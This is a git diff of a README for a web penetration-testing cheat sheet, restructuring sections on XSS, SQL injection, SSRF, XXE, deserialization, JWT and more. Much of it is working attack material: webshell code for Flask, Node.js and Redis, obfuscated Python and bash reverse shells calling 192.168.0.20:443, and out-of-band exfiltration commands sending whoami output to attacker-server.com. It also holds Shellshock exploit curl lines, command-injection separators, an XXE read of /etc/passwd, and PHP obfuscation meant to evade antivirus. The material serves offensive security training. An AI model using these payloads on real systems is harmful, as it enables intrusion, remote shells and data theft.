@@ -1,10 +1,51 @@
-# Tricks - Web Penetration Tester
-[x] In construction...
-## Topics
+<h1 align="center">Tricks - Web Penetration Tester</h1>  
 
+<p align="center">
+	<img height=500 src="https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/assets/54555784/fc570064-566e-4ef3-a7e7-7640f18da930" />
+</p>
+<h2 align="center"> [x] In construction...</h2>
+
+## Topics
 - [WAF Detection](#waf-detection)
 - [Host Obfuscation](#host-obfuscation)
 - [PHP Obfuscation Techniques](#php-obfuscation-techniques)
+- [PHP Bypass - disable_functions](#php-bypass---disable_functions)
+- [Cross-Site Scripting](#cross-site-scripting)
+- [Git Exposed](#git-exposed)
+- [Broken Access Control](#broken-access-control)
+- [Type Juggling and Hash Collision](#type-juggling-and-hash-collision)
+- [Insecure Deserialization](#insecure-deserialization)
+- [LDAP Web Exploitation](#ldap-web-exploitation)
+- [Hash Length Extension Attack](#hash-length-extension-attack)
+- [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
+- [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
+- [SQL Injection (SQLI)](#waf-detection)
+- [NoSQL Injection (NoSQLI)](#nosql-injection-nosqli)
+- [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
+- [ClickJacking](#clickjacking)
+- [Host Header Injection](#host-header-injection)
+- [HTTP Request Smuggling](#http-request-smuggling)
+- [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
+- [ClickJacking](#clickjacking)
+- [Open Redirect](#open-redirect)
+- [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
+- [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
+- [Null Origin Exploitation](#null-origin-exploitation)
+- [CRLF Injection (CRLFI)](#crlf-injection-crlfi)
+- [XML External Entity (XXE)](#xml-external-entity-xxe)
+- [XSLT Server Side Injection](#xslt-server-side-injection)
+- [Prototype Pollution](#prototype-pollution)
+- [Remote Code Execution (RCE)](#remote-code-execution-rce)
+- [API Exploitation](#api-exploitation)
+- [JWT Attacks](#jwt-attacks)
+- [Attacking OAuth](#attacking-oauth)
+- [Padding Oracle Attack](#padding-oracle-attack)
+- [Content Management System (CMS)](#content-management-system-cms)
+- [Third-party Software: ITSM, ITSO, ITBM](#third-party-software-itsm-itso-itbm)
+- [Some payloads for webshells and revshells](#some-payloads-for-webshells-and-revshells)
+- [Cloud (+)](#cloud-)
+- [Recon (+)](#recon-)
+- [Certifications (+)](#certifications-)
 
 ## WAF Detection
 ### What WAF does the application have?
@@ -101,7 +142,7 @@ https://web.archive.org/web/20160516145602/http://www.thespanner.co.uk/2011/09/2
 -> PHP Obfuscator Online - Bypass AV  
 https://www.gaijin.at/en/tools/php-obfuscator#result
 
--> base64+gzdeflate
+-> base64+gzdeflate  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/obfuscation/obfuscation.php
 
 ### Online PHP Executor
@@ -113,6 +154,7 @@ https://malwaredecoder.com/
 https://hackvertor.co.uk/public  
 
 ## PHP Bypass - disable_functions
+
 ### Functions
 
 -> shell_exec  
@@ -139,30 +181,8 @@ https://hackvertor.co.uk/public
 ```
 <?php file_get_contents($_GET['ok']);?>
 ```
-## Spoofing Internal IP in Request Header
 
-```
-X-Originating-IP: 127.0.0.1
-X-Forwarded-For: 127.0.0.1
-Forwarded-For: 127.0.0.1
-Forwarded-For-Ip: 127.0.0.1
-X-Forwarded-Host: 127.0.0.1
-X-Remote-IP: 127.0.0.1
-X-Remote-Addr: 127.0.0.1
-X-Client-IP: 127.0.0.1
-Client-IP: 127.0.0.1
-True-Client-IP: 127.0.0.1
-X-Custom-IP-Authorization: 127.0.0.1
-```
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/headers_internal_bypass.txt
-
-## 403 Bypass 
-```
-./dontgo403 -u http://site.com/admin
-```
-https://github.com/devploit/dontgo403
-
-## Cross-Site Scripting (Reflected, Stored, DOM, Mutation, Poliglote)
+## Cross-Site Scripting
 1-> Identify the language and frameworks used  
 2-> Identify entry points (parameters, inputs, responses reflecting values you can control, etc)   
 3-> Check how this is reflected in the response via source code preview or browser developer tools  
@@ -366,7 +386,8 @@ https://github.com/arthaud/git-dumper
 ### Tools
 https://github.com/internetwache/GitTools
 
-## Broken Access Control - IDOR (Insecure Direct Object References)
+## Broken Access Control
+### IDOR (Insecure Direct Object References)
 1. Search listing of Id's in requests and in case you don't find create at least two accounts and analysis requests involving ID's  
 2. Identify access controls in the application  
 3. Change the request method (GET, POST, PUT, DELETE, PATCH…)  
@@ -402,7 +423,7 @@ GET /admin/profile #Unauthorized
 GET /ADMIN/profile #Authorized
 
 ### UUIDv1
-https://caon.io/docs/exploitation/other/uuid/
+https://caon.io/docs/exploitation/other/uuid/  
 https://github.com/felipecaon/uuidv1gen
 
 #### Others
@@ -411,7 +432,29 @@ https://github.com/felipecaon/uuidv1gen
 /user/1029 # Unauthorized
 /user/1029.json # Authorized
 ```
-	
+
+### Spoofing Internal IP in Request Header
+```
+X-Originating-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+Forwarded-For: 127.0.0.1
+Forwarded-For-Ip: 127.0.0.1
+X-Forwarded-Host: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.0.1
+Client-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+```
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/headers_internal_bypass.txt
+
+### 403 Bypass 
+```
+./dontgo403 -u http://site.com/admin
+```
+https://github.com/devploit/dontgo403
+
 ## Type Juggling and Hash Collision
 https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf  
 https://github.com/JohnHammond/ctf-katana#php
@@ -521,6 +564,7 @@ https://www.bugku.net/runtime-exec-payloads/
 bash -c {echo,YmEkKClzaCAtJCgpaSAnL2Rldi90Y3AvMTkyLjE2OC4wLjIwLzQ0MyAwPiYxJw==}|{base64,-d}|{bash,-i}
 ```
 https://github.com/rodolfomarianocy/hackshell
+
 #### Tools
 https://github.com/frohoff/ysoserial  
 https://github.com/NickstaDB/SerializationDumper  
@@ -551,7 +595,6 @@ java -jar ysoserial-all.jar “JRMPClient” ip:80” |base64 -w0
 ```
 
 ### Python Deserialization
-
 #### Pickle
 ```
 import pickle
@@ -593,7 +636,7 @@ https://xcat.readthedocs.io/en/latest/
 https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/exploit/Auth_Bypass.txt  
 https://pastebin.com/raw/rKpsMp0g  
 
-## LDAP Exploitation
+## LDAP Web Exploitation
 ### LDAP Injection - Bypass Login
 
 ```$filter = "(&(uid=$username)(userPassword=$password))";```  
@@ -648,7 +691,7 @@ https://github.com/iagox86/hash_extender
 2-  
 burp intruder -> payloads.out in file parameter.  
 
-## Local File Inclusion - LFI
+## Local File Inclusion (LFI)
 ### Replace ../ - Bypass
 $language = str_replace('../', '', $_GET['file']);  
 ```
@@ -799,7 +842,7 @@ exiftool -Comment="<?php $b0=$_GET[base64_decode('b2s=')];if(isset($b0)){echo ba
 2.  
 https://site.com/upload/ok.jpg.php?ok=whoami
 
-## SQL Injection
+## SQL Injection (SQLI)
 ### SQL Injection - MySQL/MariaDB
 -> Bypass Authentication  
 ```
@@ -933,7 +976,7 @@ https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-Power
 ```
 	
 ### Scripts Example
--> Second-Order SQL Injection (query connector)  - Example (edit)
+-> Second-Order SQL Injection (query connector)  - Example (edit)  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/second-order/script.php
 	
 -> Time Based SQL Injection Script - Example (edit)  
@@ -989,7 +1032,7 @@ https://raw.githubusercontent.com/geeknik/the-nuclei-templates/main/error-based-
 https://raw.githubusercontent.com/panch0r3d/nuclei-templates/master/header_sqli.yaml
 https://raw.githubusercontent.com/ghsec/ghsec-jaeles-signatures/master/time-sqli.yaml
 
-## NOSQL Injection
+## NoSQL Injection (NoSQLI)
 -> Auth bypass  
 ```
 username=test&password=test  
@@ -998,51 +1041,7 @@ username=admin&password[$regex]=^.{6}$
 username=admin&password[$regex]=^a.....  
 ```
 
-## Webshell via redis
-```
-redis-cli -h ip  
-config set dir /var/www/html  
-config set dbfilename ok.php  
-set test "<?php system($_GET['okay'); ?>"  
-save
-```
-
-## Webshell Infecting views.py - Python (Flask)
-```
-import os
-from flask import Flask,request,os
-
-app = Flask(__name__)
-   
-@app.route('/okay')
-def cmd():
-    return os.system(request.args.get('c'))
-
-if __name__ == "__main__":
-	app.run()
-```
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.py
-	
-## Webshell infecting views.js -> nodejs
-```
-const express = require('express')
-const app = express();
-
-app.listen(3000, () => 
-	console.log('...')
-);
-function Exec(command){ 
-	const { execSync } = require("child_process");
-	const stdout = execSync(command);
-	return "Result: "+stdout
-}
-app.get('/okay/:command', (req, res) => 
-res.send(Exec(req.params.command))
-);
-```
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.js
-
-## CSRF
+## Cross-Site Request Forgery (CSRF)
 ### Tricks
 - The session must only contain Cookies or HTTP Basic Authentication header, no other headers must be used to handle the session like a JWT for example.  
 - Cross-Origin Resource Sharing (CORS) - Is used for sharing resources from different origins and allowing servers to specify who can access their assets and which HTTP request methods are allowed from external resources. You must take into account the CORS policy of the victim's website, if GET and POST requests are made from a form and you do not need to read the response the CORS policy will not prevent the attack. However, through other methods such as PUT and DELETE, for example, it will not be possible to make requests using HTML forms;  
@@ -1100,6 +1099,7 @@ XHR.send();
 </script>
 ```
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/csrf/csrf_token_bypass.html
+
 ### Analyze the token and perform brute-force
 
 1-  
@@ -1121,7 +1121,7 @@ headi -url http://site.com/admin.php
 ```
 https://github.com/mlcsec/headi
 
-## Request Smuggling
+## HTTP Request Smuggling
 ### CL.TE - Content-Length X Transfer-Encoding
 CL.TE: The frontend uses the Content-Length header and the backend server uses the Transfer-Encoding header  
 e.g.  
@@ -1184,16 +1184,27 @@ https://github.com/defparam/smuggler
 https://portswigger.net/web-security/request-smuggling  
 
 ## Open Redirect
-#### Open Redirect to XSS
+### Use of "@", to redirect to an address after the "@"
+```
+site.com@evil.com
+```
+
+### Parameter Pollution
+```
+?url=website_whitelist.com&url=site.com
+```
+
+### Open Redirect to XSS
 e.g.  
 ```
 javascript:alert(1)
+";alert(0);//
 ```
-	
+
 ### Nuclei Template
 https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/vulnerabilities/generic/open-redirect.yaml
 	
-## Server-Side Template Injection - SSTI
+## Server-Side Template Injection (SSTI)
 ### Identify
 -> Jinja2 or Twig  
 ```
@@ -1244,7 +1255,7 @@ ${{3*3}}
 ### Doc for SSTI	
 https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
   
-## Server Side Request Forgery - SSRF
+## Server-Side Request Forgery (SSRF)
 ### Bypass in Filters
 -> Host obfuscation (hex, octa, integer)  
 e.g.  
@@ -1324,28 +1335,6 @@ https://github.com/tarunkant/Gopherus
 https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf  
 https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
 
-## Insecure RMI
--> Scan on default ports with nmap  
-```
-nmap -p 1090,1098,1099,1199,4443-4446,8999-9010,9999 -sV
-```
--> remote-method-guesser  
-```
-rmg enum 172.17.0.2 9010
-```
-https://github.com/qtc-de/remote-method-guesser
-
--> JMX Exploitation  
-E.g.   
-//Open port Java RMI 9991  
-`jython sjet.py <target_host> 9991 password install http://<ip>:8000 8000`  
-`jython sjet.py <target_host> 9991 password command "ls -la"`  
-https://github.com/siberas/sjet  
-http://search.maven.org/remotecontent?filepath=org/python/jython-standalone/2.7.0/jython-standalone-2.7.0.jar  
-
--> bARMIe  
-https://github.com/NickstaDB/BaRMIe
-
 ## Null Origin Exploitation
 -> Identify - Response
 ```
@@ -1405,8 +1394,8 @@ xhr.send(null);
 </head></html>
 ```
 
-## CRLF Injection
-
+## CRLF Injection (CRLFI)
+Carriage Return (\r), Line Feed (\n)  
 e.g.  
 -> Redirect via GET  
 ```
@@ -1438,24 +1427,16 @@ https://github.com/dwisiswant0/crlfuzz
 ### Template - Nuclei
 https://raw.githubusercontent.com/pikpikcu/nuclei-templates/master/vulnerabilities/crlf-injection.yaml
 
-## Elasticsearch - API
--> Extract info  
-```
-http://<ip:>9200/_cat/indices?v  
-http://<ip>:9200/<indice>  
-http://<ip>:9200/_search?pretty=true&q=pass  
-```
-
-## XML External Entity - XXE
-### Methods:
+## XML External Entity (XXE)
+### Methods
 ```
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
 ```
 
-## XXE - Blind Out-Of-Band
-### Exfiltrate data exfiltrating data via dtd
+### XXE - Blind Out-Of-Band
+#### Exfiltrate data exfiltrating data via dtd
 -> Part 1 (Main Request)
 ```
 <!DOCTYPE r[
@@ -1531,7 +1512,6 @@ version="1.0">
 ```
 
 ## Prototype Pollution
-
 ### Client Side
 https://github.com/BlackFan/client-side-prototype-pollution
   
@@ -1558,12 +1538,49 @@ https://nodejs.org/api/child_process.html#child_processexeccommand-options-callb
 ```  
 https://nodejs.org/api/process.html
 
-## Remote Code Execution
+## Remote Code Execution (RCE)
+-> Special Characters  
+```
+& command
+&& command
+; command
+command %0A command
+| command
+|| command
+`command`
+$(command)
+```
+
+-> Out Of Band - OOB Exploitation
+```
+curl http://$(whoami).site.com/
+curl http://`whoami`.site.com/
+nslookup `whoami`.attacker-server.com &
+curl http://192.168.0.20/$(whoami)
+```
+
+-> Check if the commands are executed by PowerShell or CMD.
+```
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell 
+```
 
 ### RCE - Exfiltrating via DNS
 ```
 curl http://$(whoami).site.com/
 curl http://`whoami`.site.com/
+```
+
+### Shellshock
+-> Detection
+```
+nikto -h <IP> -C all
+```
+	
+-> Exploit
+```
+curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -c 'whoami'" <IP>
+curl -A "() { :; };echo ;/bin/bash -c 'hostname'"  <IP>
+curl -A "() { :; }; /usr/bin/nslookup $(whoami).site.com" <IP>
 ```
 
 ### Wordlists
@@ -1625,7 +1642,7 @@ https://github.com/dolevf/graphw00f
 -> GraphQL Security - Quickly assess the security of your GraphQL apps  
 https://graphql.security/
 
-## JSON Web Tokens - JWT Attacks
+## JWT Attacks
 -> Structure with jwt.io - decoder  
 https://jwt.io/  
 	
@@ -1760,7 +1777,6 @@ Authorization: Bearer <token>
 ```
 
 ## Padding Oracle Attack
-  
 e.g.  
 -> rememberMe: (Cookie)  
 -> Exploiting  
@@ -1772,83 +1788,41 @@ https://github.com/frohoff/ysoserial
 python shiro_exp.py site.com/home.jsp cookie payload.class
 ```  
 https://github.com/wuppp/shiro_rce_exp/blob/master/shiro_exp.py  
-	
-### Reverse Shell Obfuscator
-e.g.  
-`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type hex`  
+
+## Content Management System (CMS)
+### Wordpress
+-> wpscan enumeration
 ```
-py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0xC0A80014",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+wpscan --url http://site.com/wordpress --api-token <your_token> --enumerate u,vp --plugins-detection aggressive
+wpscan --url http://site.com/wordpress --api-token <your_token> --enumerate u,ap
 ```
-`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type octa`  
+-> wpscan brute force 
 ```
-py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0300.0250.0000.0024",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+wpscan --url http://site.com/ --passwords wordlist.txt
+```
+https://wpscan.com/wordpress-security-scanner
+
+### Joomla
+-> juumla  
+```
+python main.py -u <target>
 ```  
-`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type long`  
+https://github.com/oppsec/juumla  
 
+### Drupal
+-> droopescan  
 ```
-py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3232235540",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
-```  
-`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type urle`  
+droopescan scan drupal -u <target> -t 32
 ```
-py%24%28%29thon%20%24%28%29c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.0.20%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22sh%22%29%27
-```
-`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type b64`  
-```
-cHkkKCl0aG9uIC0kKCljICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTkyLjE2OC4wLjIwIiw0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJzaCIpJw==
-```
-`
-python hackshell.py --payload bash --lhost 192.168.0.20 --lport 443 --type jlre
-`
-```
-bash -c {echo,YmEkKClzaCAtJCgpaSAnL2Rldi90Y3AvMTkyLjE2OC4wLjIwLzQ0MyAwPiYxJw==}|{base64,-d}|{bash,-i}
-```
-https://github.com/rodolfomarianocy/hackshell  
+https://github.com/SamJoan/droopescan  
 
--> Other Tricks - Bypass  
-```
-"__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('id')";
-```
-	
-### OS Command Injection
--> Special Characters
-```
-& command
-&& command
-; command
-command %0A command
-| command
-|| command
-`command`
-$(command)
-```
--> -> Out Of Band - OOB Exploitation
+-> Reverse Shell  
+https://www.hackingarticles.in/drupal-reverseshell/
 
-```
-curl http://$(whoami).site.com/
-curl http://`whoami`.site.com/
-nslookup `whoami`.attacker-server.com &
-curl http://192.168.0.20/$(whoami)
-```
+### Magento
+https://github.com/steverobbins/magescan 
 
--> Check if the commands are executed by PowerShell or CMD.
-
-```
-(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell 
-```
-### Shellshock
--> Detection
-```
-nikto -h <IP> -C all
-```
-	
--> Exploit
-```
-curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -c 'whoami'" <IP>
-curl -A "() { :; };echo ;/bin/bash -c 'hostname'"  <IP>
-curl -A "() { :; }; /usr/bin/nslookup $(whoami).site.com" <IP>
-```
-	
-## Third-party Software, ITSM, ITSO, ITBM
+## Third-party Software: ITSM, ITSO, ITBM
 ### Jira
 -> Check privileges in:  
 ```
@@ -1894,61 +1868,86 @@ https://medium.com/@th3g3nt3l/multiple-information-exposed-due-to-misconfigured-
 ### Sharepoint
 https://github.com/H0j3n/EzpzSharepoint
 
-## CMS
-### Wordpress
--> wpscan  
+## Some payloads for webshells and revshells
+### Webshell Infecting views.py - Python (Flask)
 ```
-wpscan --url http://site.com/wordpress --api-token <your_token> --enumerate u,vp --plugins-detection aggressive
-wpscan --url http://site.com/wordpress --api-token <your_token> --enumerate u,ap
+import os
+from flask import Flask,request,os
+
+app = Flask(__name__)
+   
+@app.route('/okay')
+def cmd():
+    return os.system(request.args.get('c'))
+
+if __name__ == "__main__":
+	app.run()
+```
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.py
+	
+### Webshell infecting views.js -> nodejs
+```
+const express = require('express')
+const app = express();
+
+app.listen(3000, () => 
+	console.log('...')
+);
+function Exec(command){ 
+	const { execSync } = require("child_process");
+	const stdout = execSync(command);
+	return "Result: "+stdout
+}
+app.get('/okay/:command', (req, res) => 
+res.send(Exec(req.params.command))
+);
+```
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.js
+
+### Webshell via redis
+```
+redis-cli -h ip  
+config set dir /var/www/html  
+config set dbfilename ok.php  
+set test "<?php system($_GET['okay'); ?>"  
+save
+```
+
+### Reverse Shell Obfuscator
+e.g.  
+`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type hex`  
+```
+py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0xC0A80014",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+```
+`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type octa`  
+```
+py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0300.0250.0000.0024",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 ```  
-https://wpscan.com/wordpress-security-scanner
+`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type long`  
 
-### Joomla
--> juumla  
 ```
-python main.py -u <target>
+py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3232235540",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 ```  
-https://github.com/oppsec/juumla  
+`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type urle`  
+```
+py%24%28%29thon%20%24%28%29c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.0.20%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22sh%22%29%27
+```
+`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type b64`  
+```
+cHkkKCl0aG9uIC0kKCljICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTkyLjE2OC4wLjIwIiw0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJzaCIpJw==
+```
+`
+python hackshell.py --payload bash --lhost 192.168.0.20 --lport 443 --type jlre
+`
+```
+bash -c {echo,YmEkKClzaCAtJCgpaSAnL2Rldi90Y3AvMTkyLjE2OC4wLjIwLzQ0MyAwPiYxJw==}|{base64,-d}|{bash,-i}
+```
+https://github.com/rodolfomarianocy/hackshell  
 
-### Drupal
--> droopescan  
+-> Other Tricks - Bypass  
 ```
-droopescan scan drupal -u <target> -t 32
+"__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('id')";
 ```
-https://github.com/SamJoan/droopescan  
-
--> Reverse Shell  
-https://www.hackingarticles.in/drupal-reverseshell/
-
-### Magento
-https://github.com/steverobbins/magescan 
-
-## Fuzzing (+) 
-### Fuzzing Subdomain - DNS
-```
-ffuf -u "https://FUZZ.site.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
-```
-
-### Fuzzing Subdomain - VHOST
-```
-ffuf  -u "https://site.com" -H 'Host: FUZZ.site.com' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs xxx
-```
-
-### Fuzzing File Extension
-```
-ffuf -u "https://site.com/indexFUZZ" -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt -fs xxx
-```
-
-### Fuzzing Parameter GET
-```
-ffuf -u "https://site.com/index.php?FUZZ=ok" -w wordlist.txt -fs xxx
-```
-  
-### Fuzzing Parameter POST
-```
-ffuf -u "https://site.com/index.php" -X POST -d 'FUZZ=ok' -H 'Content-Type: application/x-www-form-urlencoded' -w wordlist.txt -fs xxx
-```  
-https://github.com/danielmiessler/SecLists
 
 ## Cloud (+)
 ### Tricks in AWS 
@@ -1999,7 +1998,6 @@ aws eks update-kubeconfig --region us-east-1 --name <name_cluster>
 ```
 
 ### Tools
-
 https://github.com/clarketm/s3recon  
 https://github.com/RhinoSecurityLabs/pacu
   
@@ -2088,7 +2086,33 @@ https://chaos.projectdiscovery.io/#/
 -> aquatone (Tool for visual inspection of websites)  
 https://github.com/michenriksen/aquatone  
 
-## Certifications
+### Fuzzing (+) 
+#### Fuzzing Subdomain - DNS
+```
+ffuf -u "https://FUZZ.site.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+```
+
+#### Fuzzing Subdomain - VHOST
+```
+ffuf  -u "https://site.com" -H 'Host: FUZZ.site.com' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs xxx
+```
+
+#### Fuzzing File Extension
+```
+ffuf -u "https://site.com/indexFUZZ" -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt -fs xxx
+```
+
+#### Fuzzing Parameter GET
+```
+ffuf -u "https://site.com/index.php?FUZZ=ok" -w wordlist.txt -fs xxx
+```
+  
+#### Fuzzing Parameter POST
+```
+ffuf -u "https://site.com/index.php" -X POST -d 'FUZZ=ok' -H 'Content-Type: application/x-www-form-urlencoded' -w wordlist.txt -fs xxx
+```
+
+## Certifications (+) 
 ### elearn Web Application Penetration Tester eXtreme - eWPTX
 Apresentation def con Caxias do Sul - DCG5554  
 https://www.youtube.com/watch?v=2-im6aL6PkI 
